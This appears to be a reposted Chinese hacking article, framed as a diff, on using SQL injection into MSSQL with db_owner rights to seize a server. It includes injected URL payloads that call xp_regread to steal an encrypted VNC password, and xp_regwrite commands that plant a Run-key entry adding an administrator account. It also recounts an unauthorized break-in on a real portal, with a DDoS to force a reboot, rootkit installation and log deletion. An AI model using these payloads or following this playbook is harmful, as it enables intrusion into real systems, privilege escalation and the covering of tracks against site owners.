@@ -1,0 +1,68 @@
+
+[Mssql Db_owner角色注入直接获得系统权限 全文]
+相信大家对ASP+MSSQL注入都已经很熟悉了，连一个对SQL语法丝毫不懂的人也可以用NBSI来轻松入侵大量网站。但就算是一个SQL INJECTION高手，如果针对在MSSQL中只有db_owner角色,破不出猜不到网站后台的情况下，好像也无技可施；除了用备份得到shell的这个思路，我在网上实在没有找出更好的入侵办法。不过，备份得到的shell只是理论化的东东，如果一个webshell有20mb的话，你还能用它吗？前不久，我就碰到了这样的一个台湾网站，管理员的密码倒是用NBSi跑了出来，可是用户名因为是繁体的原因在NBSi中成了一堆乱码。我也找到了后台，可只有干瞪眼的份。怎么办？我又扫了它的所有端口，发现开了5900，估计是管理员用了VNC对服务器进行了远程控制。这时，我就有一个思路，能不能把VNC在注册表的加密密码读出来再来破解呢？看我表演吧！
+
+　　TELNET服务器的5900端口，得到讯息如图1所示,证实服务器的确用的是VNC。相信大家都会用读xp_regread来读注册表了，依次提交如下语句：
+
+　　http://www.something.com/scri ... eate table [dbo].[cyfd] ([gyfd][char](255));
+
+这样我们就成功地建了一个名为cyfd的表，并且添加了类型是char，长度为255的字段名gyfd。然后向表中加数据:
+
+_blank>http://www.something.com/script.asp?id=2;DECLARE @result  ... aster.dbo.xp_regread HKE
+
+Y_CURRENT_USER,Software\ORL\WinVNC3, Password, @result output 
+
+insert into cyfd (gyfd) values(@result);--
+
+从注册表中读出VNC在注册表的加密密码的值，再把值插入到刚建的表中。然后暴出VNC在注册表的加密密码：
+
+_blank>http://www.something.com/script.asp ... sp;1=(select count(*) from cyfd where gyfd > 1)。
+
+　　可是结果大失我所望，gyfd的值是空的。如果这样容易的话，不会有这篇文章出现了。这是什么原因呢？我的语法不正确？翻来覆去的检查我的语句也没有发现错误呀。难道繁体的vnc在注册表里的位置不一样？后来我又开始在本机装了vnc又在分析查循器里做测试，得到的结果却是个数字5。这时czy上线了，询问了一下，他劝我把gyfd的这个字段改成二进制数据类型 binary来试一下。于是我又在本机测试了一下，依次提交如下语句：
+
+　　　http://127.0.0.1/script.asp?id=2;create table [dbo].[cyfd] ([gyfd][binary](20));
+
+http://127.0.0.1/script.asp?id=2;DECLARE @result bin ... er.dbo.xp_regread HKEY_CURRENT_USER,S
+
+oftware\ORL\WinVNC3, Password, @result output insert into cyfd (gyfd) values(@result);--
+
+然后我再用nbsi跑出cyfd表里gyfd这个字段的值。结果到是出来了，得到了vnc的加密密码值是0x0E3515AC00000
+
+000000000000000000000000000。可这儿还不对，我在本机装的vnc在注册表里的密码值是hex:0e,35,15,ac,00,62,d3,08这个呀。原来binary(n)的数据存储长度是固定的，当输入的二进制长度小于n时，余下长度填0补充。我在注入语句中写入的binary(20)是足够写入vnc加密密码的长度时，为什么还有那么多0来填充呢？这是因为正好我的vnc密码是0e3515ac0062d308，在碰到了00的情况下，xp_regread以为已经读完了它的值呢，把00当成了结束符，所以只读到了0x0E3515AC，我晕！
+
+　　翻了一下书，终于让我找到了一个特殊的数据类型uniqueidentifier，是用来存储一个16字节长的二进制数据类型。把注入语句改造一下：
+
+　　　http://127.0.0.1/script.asp?id=2;create table [dbo].[cyfd] ([gyfd][uniqueidentifier]);
+
+　　　http://127.0.0.1/script.asp?id=2;DECLARE @result unique ... ster.dbo.xp_regread HKEY_CURRE
+
+NT_USER,Software\ORL\WinVNC3, Password, @result output insert into cyfd (gyfd) values(@result);-- 
+
+然后再用nbsi跑一下，跑出来了，不过得到的结果是AC15350E-6200-08D3-0000-000000000000。
+
+　　AC15350E-6200-08D3-0000-000000000000和我在注册表里的正确的vnc密码的值0e3515ac0062d308相比，能看出来有什么不同吗？只不过顺序是颠倒的，相信大家都会小学的算术，这个不用我教了。试一下用cain破出vnc的密码，看看行不行
+
+　　看样子在本机做的测试一切成功。这方法用到台湾上的站点试试，哎，依然没有跑出vnc的密码，也许繁体vnc在注册表的位置不同吧。不过，我研究了一上午，有了一点收获，就放过你吧。
+
+相信大家都看过LCX大虾写的《MSSQL db_owner角色注入直接获得系统权限》吧，小弟不自量力也写写我利用MSSQL db_owner角色注入直接获得系统权限的方法。LCX大哥大致取得系统权限的思路是利用MSSQL中xp_regread的存储过程读出vnc在注册表中的密码，然后再破解，就可以拿到管理员权限。可是在网上毕竟装vnc的服务器是少数，要是一台你很想进入的服务器不装vnc，也就是说没有5900端口，尽管这个网站存在注射漏洞，你破出管理员密码，找到后台（假设这个网站没有数据库备份和文件上传及上传漏洞）但是你却没有办法取得一个shell，只有干瞪眼的份。还好sql在提供xp_regread的时候还给我们附带拉个xp_regwrite，我就利用xp_regwrite来拿系统权限，下面是我利用xp_regwrite取得系统权限的一次经历。
+
+ http://www.***.com是一个比较大的综合门户网站，ALEXA排名在前100名，好，今天的目标就是他拉，在搞之前首先要采好点，呵呵，也就是要找到注射点，这个是我们今天入侵的基础。在主页上看拉看，全部是静态网页，不存在注射的可能，可能你会说他可能是后台生成htm（开始偶也是这么认为，可是进去之后才知道原来根本不是），再源文件里找拉找也没有asp?的踪影，好看看其他的吧，恩，没费多少时间在他的动漫网中找到拉一个注射点，呵呵，开始抄家伙，恩，没费多大径就用NBSI2暴出拉管理员的密码，管理后台以及找到拉网站的绝对路径，本来以为接下来想要一个webshell应该很容易，谁知道要比我想的难得多，没有上传漏洞也就算拉，竟然连数据库备份的功能也没有，把asp木马改成后缀为jpg,gif上传竟然也没法上传成功，我倒，难道就这样放弃拉，我可不是那种轻言放弃的人，不过暂时我也没有什么好的办法，明天还要上课，只好暂时放弃。
+
+   第二天，我连上课心情都没有，满脑子里想的全是怎么拿到webshell或系统权限。好不容易等到下课，赶紧跑道计算机室里上网找找有没有关于这方面的资料，呵呵，黄天不负有心人终于让偶给找到拉一篇CZY大虾写的《How to execute system command in MSSQL》里面详述拉怎么获得管理员权限的方法，可是我的情况和czy文章里的情况略有不同，那个网站连接数据库的用户没有服务器sysadmin权限，只有数据库db_owner的权限，好多存储过程不好用，不过还好xp_regread和xp_regwrite好利用，这两个只要db_owner就好运行。好，说干就干，赶紧打开网站在注射点输入xp_regwrite ''HKEY_LOCAL_MACHINE'',''SOFTWARE\Microsoft\Windows\currentvers
+
+ion\run'',''xwq1'',''REG_SZ'',''net user xwq xwq /add''
+
+呵呵，返回一个正常页面，说明成功完成拉，再在注射点输入
+
+xp_regwrite ''HKEY_LOCAL_MACHINE'',''SOFTWARE\Microsoft\Windows\currentversion\
+
+run'',''xwq2'',''REG_SZ'',''net localgroup administrators xwq /add''
+
+好，只要让服务器重起，就会在系统中加上xwq这个管理员帐号，至于怎么让他重起，就要看各位的能耐拉，我可是迫不及待拉，赶紧ddos，过没多久，服务器就重起拉，马上用远程桌面连接连上去（呵呵，可能管理员觉得3389比较好把），输入xwq,xwq,yeah!!!进去拉，好拉接下来的事么就是留个后门rootkit+dll插入木马+asp，删除日志，克隆帐号，删除xwq这个帐号，闪人。
+
+后记，其实直接加管理员帐号的作法，很冒险，要是管理员就在电脑旁边，他肯定回起疑心，反而暴露自己的行踪，呵呵，看你运气拉。你也可以在知道网站的绝对路径之后再利用xp_regwrite在HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\currentversion\run里写上一句话木马，在用asp木马提权。
+
+本篇文章来源于 中国知音博客 转载请以链接形式注明出处 网址：www.bycnboy.comhttp://www.bycnboy.com/article.asp?id=848
+
+
+文章转载自『非安全中国网』地址: http://www.sitedirsec.com/exploit-776.html
